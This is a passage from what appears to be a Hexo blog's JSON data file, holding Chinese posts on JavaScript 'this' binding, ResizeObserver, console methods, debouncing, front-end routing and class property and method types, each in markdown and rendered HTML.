plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">// 写法一</span><br><span class=\"line\">obj.foo()</span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">foo()</span><br></pre></td></tr></table></figure>\n<p>上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123; console.log(this.bar) &#125;,</span><br><span class=\"line\">  bar: 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">var bar = 2;</span><br><span class=\"line\">obj.foo() // 1</span><br><span class=\"line\">foo() // 2</span><br></pre></td></tr></table></figure>\n<p>这种差异的原因，就在于函数体内部使用了<code>this</code>关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。<br>对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。</p>\n<p>这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？</p>\n<p>本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。</p>\n<h2 id=\"二、内存的数据结构\"><a href=\"#二、内存的数据结构\" class=\"headerlink\" title=\"二、内存的数据结构\"></a>二、内存的数据结构</h2><p>JavaScript 语言之所以有<code>this</code>的设计，跟<code>内存</code>里面的<code>数据结构</code>有关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo:  5 &#125;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码将一个<code>对象</code>赋值给变量<code>obj</code>。JavaScript 引擎会先在<code>内存</code>里面，<code>生成一个对象{ foo: 5 }</code>，然后把这个对象的<code>内存地址</code>赋值给变量obj。</p>\n<p>也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。</p>\n<p><code>原始的对象</code>以<code>字典结构</code>保存，每一个属性名都<code>对应</code>一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。</p>\n<p><strong>注意</strong>：foo属性的值保存在属性描述对象的value属性里面。</p>\n<h2 id=\"三、函数\"><a href=\"#三、函数\" class=\"headerlink\" title=\"三、函数\"></a>三、函数</h2><p>这样的结构是很清晰的，问题在于属性的值可能是一个<code>函数</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo: function () &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>\n<p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  foo: &#123;</span><br><span class=\"line\">    [[value]]: 函数的地址</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;&#125;;</span><br><span class=\"line\">var obj = &#123; f: f &#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f()</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f()</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、环境变量\"><a href=\"#四、环境变量\" class=\"headerlink\" title=\"四、环境变量\"></a>四、环境变量</h2><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(x);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>\n<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在<code>函数体内部获得当前的运行环境（context）</code>。所以，<code>this就出现</code>了，它的<code>设计目的</code>就是在函数体内部，指代函数当前的运行环境。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数体里面的this.x就是指当前运行环境的x。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var x = 1;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  f: f,</span><br><span class=\"line\">  x: 2,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f() // 1</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f() // 2</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数f在全局环境执行，this.x指向全局环境的x。<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>在obj环境执行，this.x指向obj.x<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。</p>\n<hr>\n<p><a href=\"http://www.ruanyifeng.com/blog/2018/06/javascript-this.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a> 作者：阮一峰</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JavaScript-的-this-原理\"><a href=\"#JavaScript-的-this-原理\" class=\"headerlink\" title=\"JavaScript 的 this 原理\"></a>JavaScript 的 this 原理</h1><h2 id=\"一、问题的由来\"><a href=\"#一、问题的由来\" class=\"headerlink\" title=\"一、问题的由来\"></a>一、问题的由来</h2><p>学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">// 写法一</span><br><span class=\"line\">obj.foo()</span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">foo()</span><br></pre></td></tr></table></figure>\n<p>上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  foo: function () &#123; console.log(this.bar) &#125;,</span><br><span class=\"line\">  bar: 1</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var foo = obj.foo;</span><br><span class=\"line\">var bar = 2;</span><br><span class=\"line\">obj.foo() // 1</span><br><span class=\"line\">foo() // 2</span><br></pre></td></tr></table></figure>\n<p>这种差异的原因，就在于函数体内部使用了<code>this</code>关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。<br>对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。</p>\n<p>这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？</p>\n<p>本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。</p>\n<h2 id=\"二、内存的数据结构\"><a href=\"#二、内存的数据结构\" class=\"headerlink\" title=\"二、内存的数据结构\"></a>二、内存的数据结构</h2><p>JavaScript 语言之所以有<code>this</code>的设计，跟<code>内存</code>里面的<code>数据结构</code>有关系。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo:  5 &#125;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码将一个<code>对象</code>赋值给变量<code>obj</code>。JavaScript 引擎会先在<code>内存</code>里面，<code>生成一个对象{ foo: 5 }</code>，然后把这个对象的<code>内存地址</code>赋值给变量obj。</p>\n<p>也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。</p>\n<p><code>原始的对象</code>以<code>字典结构</code>保存，每一个属性名都<code>对应</code>一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。</p>\n<p><strong>注意</strong>：foo属性的值保存在属性描述对象的value属性里面。</p>\n<h2 id=\"三、函数\"><a href=\"#三、函数\" class=\"headerlink\" title=\"三、函数\"></a>三、函数</h2><p>这样的结构是很清晰的，问题在于属性的值可能是一个<code>函数</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; foo: function () &#123;&#125; &#125;;</span><br></pre></td></tr></table></figure>\n<p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  foo: &#123;</span><br><span class=\"line\">    [[value]]: 函数的地址</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;&#125;;</span><br><span class=\"line\">var obj = &#123; f: f &#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f()</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f()</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、环境变量\"><a href=\"#四、环境变量\" class=\"headerlink\" title=\"四、环境变量\"></a>四、环境变量</h2><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(x);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>\n<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在<code>函数体内部获得当前的运行环境（context）</code>。所以，<code>this就出现</code>了，它的<code>设计目的</code>就是在函数体内部，指代函数当前的运行环境。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数体里面的this.x就是指当前运行环境的x。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var f = function () &#123;</span><br><span class=\"line\">  console.log(this.x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var x = 1;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  f: f,</span><br><span class=\"line\">  x: 2,</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">// 单独执行</span><br><span class=\"line\">f() // 1</span><br><span class=\"line\">// obj 环境执行</span><br><span class=\"line\">obj.f() // 2</span><br></pre></td></tr></table></figure>\n<p>上面代码中，函数f在全局环境执行，this.x指向全局环境的x。<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxcIaH1qiaI67Lt0fZ31q7eTFIqIBcg8mViacnWQD4MChFlaicu4HaUX4SKw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>在obj环境执行，this.x指向obj.x<br><img src=\"https://mmbiz.qpic.cn/mmbiz_png/btsCOHx9LAOGjicfd5I43teJ3ickrLuhxco6hl0vCicIXHMat4Kgt1UgdoniaMMldWogk74hVyia9DIXBHbIe142BtQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"\"></p>\n<p>回到本文开头提出的问题，obj.foo()是通过obj找到foo，所以就是在obj环境执行。一旦var foo = obj.foo，变量foo就直接指向函数本身，所以foo()就变成在全局环境执行。</p>\n<hr>\n<p><a href=\"http://www.ruanyifeng.com/blog/2018/06/javascript-this.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a> 作者：阮一峰</p>\n"},{"title":"ResizeObserver","date":"2018-05-17T01:59:17.000Z","_content":"## JS中ResizeObserver\n\n什么是观察者(Observer)\n\n\n-----------------\n[阅读原文](http://www.w3cplus.com/javascript/ResizeObserver-api.html)","source":"_posts/FrontEnd/JS/ResizeObserver.md","raw":"---\ntitle: ResizeObserver\ndate: 2018-05-17 09:59:17\ntags: ResizeObserver\ncategories: JSApi\n---\n## JS中ResizeObserver\n\n什么是观察者(Observer)\n\n\n-----------------\n[阅读原文](http://www.w3cplus.com/javascript/ResizeObserver-api.html)","slug":"FrontEnd/JS/ResizeObserver","published":1,"updated":"2018-09-05T06:33:18.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzs009qzodva55j0882","content":"<h2 id=\"JS中ResizeObserver\"><a href=\"#JS中ResizeObserver\" class=\"headerlink\" title=\"JS中ResizeObserver\"></a>JS中ResizeObserver</h2><p>什么是观察者(Observer)</p>\n<hr>\n<p><a href=\"http://www.w3cplus.com/javascript/ResizeObserver-api.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JS中ResizeObserver\"><a href=\"#JS中ResizeObserver\" class=\"headerlink\" title=\"JS中ResizeObserver\"></a>JS中ResizeObserver</h2><p>什么是观察者(Observer)</p>\n<hr>\n<p><a href=\"http://www.w3cplus.com/javascript/ResizeObserver-api.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"console食用方法","date":"2018-06-12T06:31:29.000Z","_content":"# console的食用方法\n\n  **console.log**\n\n  **console.dir**\n\n    打印方法 ","source":"_posts/FrontEnd/JS/console食用方法.md","raw":"---\ntitle: console食用方法\ndate: 2018-06-12 14:31:29\ntags: console\ncategories: JS-console\n---\n# console的食用方法\n\n  **console.log**\n\n  **console.dir**\n\n    打印方法 ","slug":"FrontEnd/JS/console食用方法","published":1,"updated":"2018-09-05T06:33:18.457Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzt009tzodvfhoniffo","content":"<h1 id=\"console的食用方法\"><a href=\"#console的食用方法\" class=\"headerlink\" title=\"console的食用方法\"></a>console的食用方法</h1><p>  <strong>console.log</strong></p>\n<p>  <strong>console.dir</strong></p>\n<pre><code>打印方法 \n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"console的食用方法\"><a href=\"#console的食用方法\" class=\"headerlink\" title=\"console的食用方法\"></a>console的食用方法</h1><p>  <strong>console.log</strong></p>\n<p>  <strong>console.dir</strong></p>\n<pre><code>打印方法 \n</code></pre>"},{"title":"函数防抖与函数节流","date":"2018-07-03T08:52:51.000Z","_content":"## 函数防抖动与节流\n\n---\n[阅读原文](http://web.jobbole.com/94844/)","source":"_posts/FrontEnd/JS/函数防抖与函数节流.md","raw":"---\ntitle: 函数防抖与函数节流\ndate: 2018-07-03 16:52:51\ntags: 函数防抖/节流\ncategories: JS\n---\n## 函数防抖动与节流\n\n---\n[阅读原文](http://web.jobbole.com/94844/)","slug":"FrontEnd/JS/函数防抖与函数节流","published":1,"updated":"2018-09-05T06:33:18.458Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzv009xzodvx9gcl7x7","content":"<h2 id=\"函数防抖动与节流\"><a href=\"#函数防抖动与节流\" class=\"headerlink\" title=\"函数防抖动与节流\"></a>函数防抖动与节流</h2><hr>\n<p><a href=\"http://web.jobbole.com/94844/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"函数防抖动与节流\"><a href=\"#函数防抖动与节流\" class=\"headerlink\" title=\"函数防抖动与节流\"></a>函数防抖动与节流</h2><hr>\n<p><a href=\"http://web.jobbole.com/94844/\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"前端路由跳转","date":"2018-07-30T02:13:58.000Z","_content":"## 原生路由跳转\n````\nwindow.location.href = uri(path) // 完整地址\n\nwindow.location.hash = uri(path) // 锚点地址\n\nwindow.location.reload()\n\nwindow.history.go(0)\n\ndocument.execCommand('Refresh')\n````\n[js刷新页面的方法](http://www.cnblogs.com/cfinder010/p/3852360.html)\n---\n\n## Vue路由跳转\n````\nthis.$router.push({\n  name: 'login'\n});\n````\n详见 个人项目 `shrsBack`  \n涉及 `Vue.router`\n\n---\n","source":"_posts/FrontEnd/JS/前端路由跳转.md","raw":"---\ntitle: 前端路由跳转\ndate: 2018-07-30 10:13:58\ntags: 路由跳转\ncategories: 前端路由\n---\n## 原生路由跳转\n````\nwindow.location.href = uri(path) // 完整地址\n\nwindow.location.hash = uri(path) // 锚点地址\n\nwindow.location.reload()\n\nwindow.history.go(0)\n\ndocument.execCommand('Refresh')\n````\n[js刷新页面的方法](http://www.cnblogs.com/cfinder010/p/3852360.html)\n---\n\n## Vue路由跳转\n````\nthis.$router.push({\n  name: 'login'\n});\n````\n详见 个人项目 `shrsBack`  \n涉及 `Vue.router`\n\n---\n","slug":"FrontEnd/JS/前端路由跳转","published":1,"updated":"2018-10-21T09:44:05.123Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzx00a0zodvwc4tqm6b","content":"<h2 id=\"原生路由跳转\"><a href=\"#原生路由跳转\" class=\"headerlink\" title=\"原生路由跳转\"></a>原生路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href = uri(path) // 完整地址</span><br><span class=\"line\"></span><br><span class=\"line\">window.location.hash = uri(path) // 锚点地址</span><br><span class=\"line\"></span><br><span class=\"line\">window.location.reload()</span><br><span class=\"line\"></span><br><span class=\"line\">window.history.go(0)</span><br><span class=\"line\"></span><br><span class=\"line\">document.execCommand(&apos;Refresh&apos;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"js刷新页面的方法\"><a href=\"#js刷新页面的方法\" class=\"headerlink\" title=\"js刷新页面的方法\"></a><a href=\"http://www.cnblogs.com/cfinder010/p/3852360.html\" target=\"_blank\" rel=\"noopener\">js刷新页面的方法</a></h2><h2 id=\"Vue路由跳转\"><a href=\"#Vue路由跳转\" class=\"headerlink\" title=\"Vue路由跳转\"></a>Vue路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$router.push(&#123;</span><br><span class=\"line\">  name: &apos;login&apos;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>详见 个人项目 <code>shrsBack</code><br>涉及 <code>Vue.router</code></p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"原生路由跳转\"><a href=\"#原生路由跳转\" class=\"headerlink\" title=\"原生路由跳转\"></a>原生路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href = uri(path) // 完整地址</span><br><span class=\"line\"></span><br><span class=\"line\">window.location.hash = uri(path) // 锚点地址</span><br><span class=\"line\"></span><br><span class=\"line\">window.location.reload()</span><br><span class=\"line\"></span><br><span class=\"line\">window.history.go(0)</span><br><span class=\"line\"></span><br><span class=\"line\">document.execCommand(&apos;Refresh&apos;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"js刷新页面的方法\"><a href=\"#js刷新页面的方法\" class=\"headerlink\" title=\"js刷新页面的方法\"></a><a href=\"http://www.cnblogs.com/cfinder010/p/3852360.html\" target=\"_blank\" rel=\"noopener\">js刷新页面的方法</a></h2><h2 id=\"Vue路由跳转\"><a href=\"#Vue路由跳转\" class=\"headerlink\" title=\"Vue路由跳转\"></a>Vue路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.$router.push(&#123;</span><br><span class=\"line\">  name: &apos;login&apos;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>详见 个人项目 <code>shrsBack</code><br>涉及 <code>Vue.router</code></p>\n<hr>\n"},{"title":"剖析JS属性、方法","date":"2018-07-25T01:14:21.000Z","_content":"\n## [剖析JS属性、方法](https://news.html5.qq.com/share/164582063261917465?url=http%3A%2F%2Fkuaibao.qq.com%2Fs%2F20180725A08BMB00&sh_sid=2__o9GiTuOu_QRC6DkXCyHHQgkLHmPo__2d72ce3ac1ca7644990ae3e313b788cb&ch=060000&qbredirect=&share=true&sc_id=uv6GTqC)\n\n玩转JavaScript，得有很扎实的基础，基础体现在哪？其中一个最重要的点就是对`JavaScript的属性和方法`有足够的了解和认识。这里，我会带大家一起来彻底消灭这些盲点（对JavaScript属性和方法的分类还存在模糊的印象）。\n\n### **一、属性**\nJS属性四种类型：`私有属性`，`原型属性`，`实例属性`，`类属性`。\n\n区别和使用：\n````\nvar a = function () {\n  var x = 'a'; // 私有属性\n  this.z = 'c'; // 实例属性\n}\na.y = 'b'; // 类属性\na.prototype.m = 'd'; // 原型属性\n````\n\n````\nvar t1 = new a();\nconsole.log(t1.x) // undefined [`实例`不能访问`私有变量`，私有变量只在`函数内`使用]\nconsole.log(t1.y) // undefined [`实例`不能访问`类属性`，类属性只有类本身才能访问，实例不能访问]\nconsole.log(t1.z) // c [`实例`访问`实例属性`]\nconsole.log(t1.m) // d [`实例`访问`原型属性`]\n\nconsole.log(a.x) // undefined [`类`不能访问`私有变量`，私有变量只在`函数内`使用]\nconsole.log(a.y) // b [`类属性`只有类本身才能访问]\nconsole.log(a.z) // undefined [`类`本身无法访问`实例属性`]\nconsole.log(a.m) // undefined [`类`本身无法访问`原型属性`]\n````\n\n**注意总结**\n\n1. `私有变量`只能在`函数内`使用。\n2. `实例属性`和`原型属性`拥有`相同变量`时，优先访问`实例属性`。\n3. 如上`变量y`，只有`类本身`才能访问`类属性，实例不能访问。\n\n### **二、方法**\n方法类型：`静态方法`，`实例方法`，`内部方法`\n\n\n1. 静态方法(不能被实例对象调用)\n````\nvar b = function() {}\nb.f1 = function() { // 定义一个`静态方法`\n  console.log('静态方法')\n}\nb.f1() // 静态方法\n\nvar c = new b()\nc.f1() // c.f1 is not a function\n````\n\n2. 实例方法(注意访问优先级)\n\nJS定义一个`实例方法`有三种方式：\n① 构造函数中使用`this`\n② 直接绑定在`实例`上\n③ 绑定在`原型`上\n````\nvar b = function() {\n  this.method1 = function() {\n    console.log('this')\n  }\n} // 构造函数`this`\n\nvar c = new b()\nc.method1 = function() {\n  console.log('instance')\n} // `实例`绑定\n\nb.prototype.method1 = function() {\n  console.log('prototype')\n} // `原型`绑定\n````\n**总结**\n\n上述代码展示了三种方式定义`实例方法`。\n\n**执行顺序:**`实例上绑定`的优先级高于`this上绑定`的，`this上绑定`的高于`原型上绑定`的实例方法。\n\n`实例上绑定` > `this上绑定` > `原型上绑定`\n\n3. 内部方法(只能内部调用)\n````\nvar b = function() {\n  var method1 = function() {\n    console.log('method1')\n  }\n  var method2 = function() {\n    console.log('method2')\n    method1()\n  }\n  this.method3 = function() {\n    method2()\n  }\n}\n\nvar c = new b()\nc.method1() // c.method1 is not a function\nc.method3() // method2 method1\n````\n上面代码定义了两个内部方法`method1`和`method2`。由运行结果可知，内部方法method1和method2`只能在函数内部调用`，外部通过实例对象无法找到该方法。\n\n## **最后总结一下：**\n通过这篇文章，我们知道了`属性的定义`，属性分`私有属性`，`原型属性`，`实例属性`，`类属性`，这`四种`，它们各自是怎么定义，及访问原则。同时我们也知道了`方法的定义`，方法分`静态方法`，`实例方法`，`内部方法`三种，主要注意一下它们的调用，及`实例方法的三种创建形式`。\n\n属性的定义[4种]  \n1· 私有属性  \n2· 原型属性  \n3· 实例属性  \n4· 类属性\n\n方法的定义[3种]  \n1· 静态方法  \n2· 实例方法  \n3· 内部方法  \n","source":"_posts/FrontEnd/JS/剖析JS中Class 属性、方法.md","raw":"---\ntitle: 剖析JS属性、方法\ndate: 2018-07-25 09:14:21\ntags: JS属性与方法分类\ncategories: JS\n---\n\n## 